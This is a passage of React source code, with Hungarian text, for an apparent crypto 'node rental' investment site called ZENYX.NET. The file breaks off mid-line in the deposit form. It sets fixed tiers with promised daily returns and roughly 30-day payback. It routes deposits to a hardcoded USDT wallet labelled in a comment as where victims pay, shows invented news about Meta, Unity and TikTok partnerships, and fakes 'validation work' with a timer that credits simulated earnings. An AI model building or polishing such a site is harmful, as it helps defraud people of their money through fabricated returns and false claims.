'use client';

import React, { useState } from 'react';
import { 
  LayoutDashboard, Server, Wallet, Newspaper, 
  Menu, X, Hexagon, ArrowRight, ShieldCheck, 
  CheckCircle2, AlertCircle, Copy, Upload, ArrowUpRight,
  Lock, TrendingUp, DollarSign, Activity
} from 'lucide-react';

// --- KONFIGURÁCIÓ: A SZINTEK ÉS JÖVEDELMEK ---
const LEVELS = [
  { id: 1, name: 'Start Node', price: 200, daily: 6.70, color: 'text-blue-400', border: 'border-blue-500/50', bg: 'bg-blue-500/10' },
  { id: 2, name: 'Pro Node', price: 800, daily: 26.70, color: 'text-violet-400', border: 'border-violet-500/50', bg: 'bg-violet-500/10' },
  { id: 3, name: 'Advanced Node', price: 1300, daily: 43.40, color: 'text-emerald-400', border: 'border-emerald-500/50', bg: 'bg-emerald-500/10' },
  { id: 4, name: 'Enterprise Node', price: 2500, daily: 83.40, color: 'text-amber-400', border: 'border-amber-500/50', bg: 'bg-amber-500/10' },
  { id: 5, name: 'Master Node', price: 3600, daily: 120.00, color: 'text-red-400', border: 'border-red-500/50', bg: 'bg-red-500/10' }
];

// --- A TE USDT TÁRCÁD (IDE FIZETNEK) ---
const MY_WALLET_ADDRESS = "TL9t1WpL7H8m4K3gR5X2jF9c1vB7n4x3Z1"; 

export default function Dashboard() {
  const [activeTab, setActiveTab] = useState('news'); // Alapértelmezett: HÍREK
  const [isMobileMenuOpen, setIsMobileMenuOpen] = useState(false);
  
  // Felhasználó adatok (Szimulált)
  const [balance, setBalance] = useState(0.00); // Üres egyenleg
  const [currentLevel, setCurrentLevel] = useState<any>(null); // Nincs aktív csomagja
  const [taskCompleted, setTaskCompleted] = useState(false);
  const [isMining, setIsMining] = useState(false);
  const [progress, setProgress] = useState(0);

  // --- MUNKA FOLYAMAT ---
  const handleStartTask = () => {
    if (!currentLevel) {
       alert("Hiba: A feladat elvégzéséhez előbb aktiválnod kell egy Validációs Csomópontot (Csomagok menü)!");
       return;
    }
    if (taskCompleted) return;

    setIsMining(true);
    let p = 0;
    const interval = setInterval(() => {
      p += 2;
      setProgress(p);
      if (p >= 100) {
        clearInterval(interval);
        setIsMining(false);
        setTaskCompleted(true);
        setBalance(prev => prev + currentLevel.daily); // A szintnek megfelelő pénzt kapja
      }
    }, 50);
  };

  const renderContent = () => {
    switch(activeTab) {
      case 'news': return <NewsView />;
      case 'packages': return <PackagesView currentLevel={currentLevel} onUpgrade={setCurrentLevel} balance={balance} />;
      case 'work': return <WorkStation level={currentLevel} isMining={isMining} progress={progress} taskCompleted={taskCompleted} onStart={handleStartTask} />;
      case 'wallet': return <WalletView balance={balance} />;
      default: return <NewsView />;
    }
  };

  return (
    <div className="min-h-screen bg-[#0b0f19] text-slate-200 font-sans flex flex-col md:flex-row">
      
      {/* SIDEBAR */}
      <aside className="hidden md:flex flex-col w-64 bg-[#111827] border-r border-slate-800 h-screen sticky top-0">
        <div className="p-6 border-b border-slate-800 flex items-center gap-2">
           <Hexagon className="text-indigo-500 fill-indigo-500/20" />
           <span className="font-black text-white text-lg tracking-tight">ZENYX<span className="text-indigo-500">.NET</span></span>
        </div>
        <nav className="flex-1 p-4 space-y-2">
          <NavButton icon={<Newspaper size={18}/>} label="Hírek (Főoldal)" active={activeTab === 'news'} onClick={() => setActiveTab('news')} />
          <NavButton icon={<Server size={18}/>} label="Csomagok (Node)" active={activeTab === 'packages'} onClick={() => setActiveTab('packages')} highlight />
          <NavButton icon={<Activity size={18}/>} label="Munkaállomás" active={activeTab === 'work'} onClick={() => setActiveTab('work')} />
          <NavButton icon={<Wallet size={18}/>} label="Pénztárca" active={activeTab === 'wallet'} onClick={() => setActiveTab('wallet')} />
        </nav>
        <div className="p-4 bg-[#0b0f19]">
           <div className="text-xs text-slate-500 uppercase font-bold mb-1">Egyenleg</div>
           <div className="text-xl font-black text-emerald-400">$ {balance.toFixed(2)}</div>
        </div>
      </aside>

      {/* MOBILE HEADER */}
      <div className="md:hidden h-16 bg-[#111827] flex items-center justify-between px-4 border-b border-slate-800 sticky top-0 z-50">
         <span className="font-black text-white">ZENYX</span>
         <button onClick={() => setIsMobileMenuOpen(!isMobileMenuOpen)}><Menu /></button>
      </div>

      {/* MOBILE MENU OVERLAY */}
      {isMobileMenuOpen && (
         <div className="fixed inset-0 bg-[#111827] z-50 p-6 flex flex-col gap-4">
            <div className="flex justify-between mb-8">
               <span className="font-black text-white text-xl">MENÜ</span>
               <button onClick={() => setIsMobileMenuOpen(false)}><X /></button>
            </div>
            <NavButton icon={<Newspaper size={20}/>} label="Hírek" active={activeTab === 'news'} onClick={() => {setActiveTab('news'); setIsMobileMenuOpen(false)}} />
            <NavButton icon={<Server size={20}/>} label="Csomagok" active={activeTab === 'packages'} onClick={() => {setActiveTab('packages'); setIsMobileMenuOpen(false)}} />
            <NavButton icon={<Activity size={20}/>} label="Munka" active={activeTab === 'work'} onClick={() => {setActiveTab('work'); setIsMobileMenuOpen(false)}} />
            <NavButton icon={<Wallet size={20}/>} label="Pénztárca" active={activeTab === 'wallet'} onClick={() => {setActiveTab('wallet'); setIsMobileMenuOpen(false)}} />
         </div>
      )}

      {/* MAIN CONTENT */}
      <main className="flex-1 p-4 md:p-8 overflow-y-auto">
         {renderContent()}
      </main>

    </div>
  );
}

// ==============================================================================
// 1. HÍREK NÉZET (DEFAULT HOME)
// ==============================================================================
function NewsView() {
   return (
      <div className="space-y-6 animate-in fade-in">
         <div className="flex justify-between items-center mb-4">
            <h2 className="text-2xl font-bold text-white">Piaci Hírek & Jelentések</h2>
            <span className="text-xs text-slate-500 bg-slate-800 px-2 py-1 rounded">Élő Feed</span>
         </div>

         {/* KIEMELT NAGY HÍR */}
         <div className="relative h-80 rounded-2xl overflow-hidden border border-slate-700 group cursor-pointer">
            <div className="absolute inset-0 bg-gradient-to-t from-[#0b0f19] via-transparent to-transparent z-10"></div>
            <div className="absolute inset-0 bg-[url('https://images.unsplash.com/photo-1621416894569-0f39ed31d247?auto=format&fit=crop&q=80')] bg-cover bg-center group-hover:scale-105 transition-transform duration-700"></div>
            <div className="absolute bottom-0 left-0 p-6 z-20 max-w-2xl">
               <span className="bg-indigo-600 text-white text-xs font-bold px-2 py-1 rounded mb-2 inline-block">TECHNOLÓGIA</span>
               <h3 className="text-3xl font-black text-white mb-2 leading-tight">
                  A Zenyx hálózat forgalma 300%-kal nőtt az Q4-ben
               </h3>
               <p className="text-slate-300">
                  A nagyvállalati partnerek (Meta, Unity) növekvő igénye miatt új validációs node-ok bevonása vált szükségessé.
               </p>
            </div>
         </div>

         {/* HÍR LISTA */}
         <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <NewsItem 
               tag="UPDATE" title="Kifizetési kapu frissítés: TRC20" 
               desc="A tranzakciós díjak csökkentése érdekében a rendszer mostantól a TRON hálózatot preferálja."
               date="2 órája"
            />
            <NewsItem 
               tag="PARTNER" title="Új szerződés a TikTok Ads-el" 
               desc="A videós hirdetések validálása kiemelt prioritásúvá vált. A Master Node tulajdonosok előnyben."
               date="Tegnap"
            />
            <NewsItem 
               tag="ELEMZÉS" title="Miért fontos a Node Letét?" 
               desc="A biztonsági letét garantálja a hálózat stabilitását, így a hirdetők hajlandóak magasabb árat fizetni."
               date="2 napja"
            />
            <NewsItem 
               tag="PIAC" title="Bitcoin felezés hatása" 
               desc="A kriptopiac élénkülése növeli a hirdetési kedvet a pénzügyi szektorban."
               date="3 napja"
            />
         </div>
      </div>
   )
}

// ==============================================================================
// 2. CSOMAGOK (SZINTEK) - A BEFIZETÉS LÉNYEGE
// ==============================================================================
function PackagesView({ currentLevel, onUpgrade, balance }: any) {
   const handleBuy = (level: any) => {
      if (balance >= level.price) {
         // Ha van pénze (szimulált), megveszi
         onUpgrade(level);
         alert(`Sikeres aktiválás! Mostantól a ${level.name} szinten vagy.`);
      } else {
         // Ha nincs pénze, a tárcához küldjük
         const confirm = window.confirm(`Nincs elegendő egyenleged ($${balance}). A ${level.name} aktiválásához $${level.price} szükséges. Szeretnél befizetni?`);
         if(confirm) {
            // Itt elvileg átirányítanánk a Wallet fülre, de most csak üzenünk
            alert("Kérlek menj a Pénztárca menüpontra és töltsd fel az egyenleged!");
         }
      }
   }

   return (
      <div className="space-y-8 animate-in fade-in">
         <div className="bg-gradient-to-r from-indigo-900/50 to-slate-900 border border-indigo-500/30 p-6 rounded-2xl relative overflow-hidden">
            <div className="relative z-10">
               <h2 className="text-2xl font-bold text-white mb-2 flex items-center gap-2">
                  <ShieldCheck className="text-indigo-400"/> Operatív Letét & Node Bérlés
               </h2>
               <p className="text-indigo-200 text-sm max-w-3xl leading-relaxed">
                  A Zenyx hálózatban a munkavégzéshez (validáláshoz) <strong>biztonsági letét (Security Bond)</strong> szükséges. 
                  Ez garantálja partnereink felé a rendelkezésre állást. <br/>
                  <span className="text-white font-bold underline">FONTOS:</span> A letét összege 12 hónap aktív munkavégzés után 100%-ban visszatérítésre kerül. A napi hozamokból a letét ára már az 1. hónapban megtérül!
               </p>
            </div>
         </div>

         <div className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-6">
            {LEVELS.map((level) => (
               <div key={level.id} className={`bg-[#151a25] border ${level.border} rounded-2xl p-6 relative flex flex-col hover:scale-105 transition-transform duration-300 shadow-xl`}>
                  {currentLevel?.id === level.id && (
                     <div className="absolute top-0 right-0 bg-emerald-500 text-white text-[10px] font-bold px-3 py-1 rounded-bl-xl">AKTÍV</div>
                  )}
                  
                  <div className={`w-12 h-12 rounded-xl ${level.bg} flex items-center justify-center mb-4`}>
                     <Server className={level.color} size={24} />
                  </div>
                  
                  <h3 className={`text-xl font-bold text-white mb-1`}>{level.name}</h3>
                  <div className="text-3xl font-black text-white mb-4">$ {level.price}</div>
                  
                  <div className="space-y-3 mb-8 flex-1">
                     <div className="flex justify-between items-center text-sm border-b border-slate-800 pb-2">
                        <span className="text-slate-400">Napi Hozam</span>
                        <span className={`font-bold ${level.color}`}>$ {level.daily.toFixed(2)}</span>
                     </div>
                     <div className="flex justify-between items-center text-sm border-b border-slate-800 pb-2">
                        <span className="text-slate-400">Havi Hozam</span>
                        <span className="font-bold text-white">$ {(level.daily * 30).toFixed(2)}</span>
                     </div>
                     <div className="flex justify-between items-center text-sm">
                        <span className="text-slate-400">Megtérülés</span>
                        <span className="font-bold text-emerald-400">~ 30 Nap</span>
                     </div>
                  </div>

                  <button 
                     onClick={() => handleBuy(level)}
                     disabled={currentLevel?.id >= level.id}
                     className={`w-full py-3 rounded-xl font-bold transition-all ${
                        currentLevel?.id === level.id 
                        ? 'bg-slate-700 text-slate-400 cursor-not-allowed'
                        : 'bg-white text-black hover:bg-indigo-50 hover:text-indigo-600'
                     }`}
                  >
                     {currentLevel?.id === level.id ? 'Jelenlegi Szint' : 'Letét Befizetése'}
                  </button>
               </div>
            ))}
         </div>
      </div>
   )
}

// ==============================================================================
// 3. MUNKAÁLLOMÁS (VALIDÁLÁS)
// ==============================================================================
function WorkStation({ level, isMining, progress, taskCompleted, onStart }: any) {
   return (
      <div className="max-w-2xl mx-auto space-y-6 animate-in fade-in">
         {/* INFO BOX */}
         <div className="text-center mb-8">
            <h2 className="text-3xl font-black text-white mb-2">Validációs Terminál</h2>
            <p className="text-slate-400">
               Jelenlegi státusz: {level ? <span className={`font-bold ${level.color}`}>{level.name}</span> : <span className="text-red-400 font-bold">Inaktív (Nincs Csomag)</span>}
            </p>
         </div>

         <div className="bg-[#111827] border border-slate-700 rounded-3xl p-8 shadow-2xl relative overflow-hidden">
            {/* TERMINAL UI */}
            <div className="bg-black rounded-xl border border-slate-800 p-6 h-48 font-mono text-xs flex flex-col justify-end mb-8 relative">
               {!level && <span className="text-red-500">ERROR: Node not found. Please purchase a package.</span>}
               {level && !isMining && !taskCompleted && <span className="text-emerald-500 animate-pulse">System Ready. Waiting for user input...</span>}
               
               {isMining && (
                  <div className="space-y-1">
                     <p className="text-slate-500">Connecting to Ad-Exchange Server...</p>
                     <p className="text-slate-300">Validating Batch #9921...</p>
                     <div className="w-full bg-slate-800 h-1 mt-2">
                        <div className="bg-emerald-500 h-full transition-all duration-75" style={{width: `${progress}%`}}></div>
                     </div>
                  </div>
               )}

               {taskCompleted && (
                  <div className="absolute inset-0 flex flex-col items-center justify-center bg-black/80">
                     <CheckCircle2 size={40} className="text-emerald-500 mb-2"/>
                     <span className="text-emerald-400 font-bold text-lg">BATCH COMPLETED</span>
                     <span className="text-white">Jutalék: +$ {level.daily.toFixed(2)}</span>
                  </div>
               )}
            </div>

            <button
               onClick={onStart}
               disabled={!level || isMining || taskCompleted}
               className={`w-full py-4 rounded-xl font-bold text-lg uppercase tracking-widest transition-all ${
                  !level ? 'bg-slate-800 text-slate-500 cursor-not-allowed' :
                  taskCompleted ? 'bg-emerald-900/50 text-emerald-500 cursor-default border border-emerald-500/20' :
                  isMining ? 'bg-indigo-900 text-indigo-200 cursor-wait' :
                  'bg-gradient-to-r from-indigo-600 to-violet-600 text-white hover:scale-[1.02] shadow-lg shadow-indigo-500/20'
               }`}
            >
               {taskCompleted ? 'Mai feladat kész' : isMining ? 'Feldolgozás...' : 'Start Validálás'}
            </button>
            
            {!level && (
               <p className="text-center text-xs text-red-400 mt-4">
                  <AlertCircle size={12} className="inline mr-1"/>
                  A munka megkezdéséhez aktiválj egy szintet a Csomagok menüben!
               </p>
            )}
         </div>
      </div>
   )
}

// ==============================================================================
// 4. PÉNZTÁRCA (BEFIZETÉS / KIFIZETÉS)
// ==============================================================================
function WalletView({ balance }: any) {
   const [mode, setMode] = useState('deposit'); // deposit | withdraw

   return (
      <div className="max-w-3xl mx-auto space-y-8 animate-in fade-in">
         
         {/* BALANCE CARD */}
         <div className="bg-gradient-to-br from-[#1e1b4b] to-[#111827] border border-indigo-500/30 rounded-2xl p-8 text-center relative overflow-hidden">
            <div className="absolute -top-10 -right-10 w-40 h-40 bg-indigo-500/20 rounded-full blur-3xl"></div>
            <p className="text-slate-400 text-sm font-bold uppercase tracking-widest mb-2">Teljes Egyenleg</p>
            <h2 className="text-5xl font-black text-white mb-6">$ {balance.toFixed(2)}</h2>
            <div className="flex justify-center gap-4 relative z-10">
               <button onClick={() => setMode('deposit')} className={`px-6 py-2 rounded-lg font-bold text-sm transition-all ${mode === 'deposit' ? 'bg-indigo-600 text-white' : 'bg-slate-800 text-slate-400 hover:text-white'}`}>Befizetés</button>
               <button onClick={() => setMode('withdraw')} className={`px-6 py-2 rounded-lg font-bold text-sm transition-all ${mode === 'withdraw' ? 'bg-indigo-600 text-white' : 'bg-slate-800 text-slate-400 hover:text-white'}`}>Kifizetés</button>
            </div>
         </div>

         {/* ACTION AREA */}
         <div className="bg-[#111827] border border-slate-700 rounded-2xl p-6 md:p-8">
            {mode === 'deposit' ? (
               <div className="space-y-6">
                  <h3 className="text-xl font-bold text-white flex items-center gap-2"><ArrowUpRight className="text-emerald-400"/> Egyenleg Feltöltés</h3>
                  <div className="bg-amber-500/10 border border-amber-500/20 p-4 rounded-xl text-sm text-amber-200">
                     <AlertCircle size={16} className="inline mr-2"/>
                     Csak <strong>USDT (TRC20)</strong> hálózaton küldj! Más hálózat használata a pénz elvesztéséhez vezethet.
                  </div>

                  <div className="space-y-2">
                     <label className="text-xs text-slate-400 uppercase font-bold">Céges TRC20 Tárca Cím</label>
                     <div className="flex gap-2">
                        <div className="flex-1 bg-black border border-slate-700 p-4 rounded-xl text-white font-mono text-sm break-all">
                           {MY_WALLET_ADDRESS}
                        </div>
                        <button className="bg-slate-800 hover:bg-slate-700 px-4 rounded-xl text-white">
                           <Copy size={20}/>
                        </button>
                     </div>
                  </div>

                  <div className="space-y-2 pt-4 border-t border-slate-800">
                     <label className="text-xs text-slate-400 uppercase font-bold">Tranzakció Azonosító (TXID / Hash)</label>
                     <input type="text" placeholder="Másold be ide a tranzakció hash-t..." className="w-full bg-[#0b0f19] border border-slate-700 p-4 rounded-xl text-white outline-none focus:border-indigo-500" />
                     <button className="w-full bg-emerald-600 hover:bg-emerald-500 py-4 rounded-xl font